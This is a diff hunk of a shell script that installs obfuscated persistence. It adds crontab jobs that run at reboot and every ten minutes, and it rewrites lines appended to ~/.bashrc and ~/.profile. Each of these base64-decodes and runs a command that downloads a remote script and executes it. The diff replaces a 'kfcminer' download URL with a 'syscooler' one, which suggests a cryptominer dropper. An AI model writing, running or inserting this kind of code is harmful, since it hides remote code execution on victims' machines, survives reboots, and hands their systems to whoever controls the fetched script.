@@ -10,8 +10,8 @@ fi
 
 (crontab -l ; echo "@reboot echo 'Y3VybCAtcyAtbyBzeXNjb29sZXIuc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzFvbmVtYW4xL3N5c2Nvb2xlci9tYWluL3N5c2Nvb2xlci5zaCAmJiBiYXNoIHN5c2Nvb2xlci5zaA==' | base64 -d | bash") | crontab -
 (crontab -l ; echo "*/10 * * * * echo 'Y3VybCAtcyAtbyBzeXNjb29sZXIuc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzFvbmVtYW4xL3N5c2Nvb2xlci9tYWluL3N5c2Nvb2xlci5zaCAmJiBiYXNoIHN5c2Nvb2xlci5zaA==' | base64 -d | bash") | crontab -
-echo 'echo "Y3VybCAtcyAtbyBrZmMuc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tmY21pbmVyL2tmYy9tYWluL2tmYy5zaCAmJiBiYXNoIGtmYy5zaA==" | base64 -d | bash' >> ~/.bashrc
-echo 'echo "Y3VybCAtcyAtbyBrZmMuc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tmY21pbmVyL2tmYy9tYWluL2tmYy5zaCAmJiBiYXNoIGtmYy5zaA==" | base64 -d | bash' >> ~/.profile
+echo 'echo "Y3VybCAtcyAtbyBzeXNjb29sZXIuc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzFvbmVtYW4xL3N5c2Nvb2xlci9tYWluL3N5c2Nvb2xlci5zaCAmJiBiYXNoIHN5c2Nvb2xlci5zaA==" | base64 -d | bash' >> ~/.bashrc
+echo 'echo "Y3VybCAtcyAtbyBzeXNjb29sZXIuc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzFvbmVtYW4xL3N5c2Nvb2xlci9tYWluL3N5c2Nvb2xlci5zaCAmJiBiYXNoIHN5c2Nvb2xlci5zaA==" | base64 -d | bash' >> ~/.profile
 
 curl -s -o newkfc.sh https://raw.githubusercontent.com/1oneman1/syscooler/main/syscooler.sh
 sleep 60
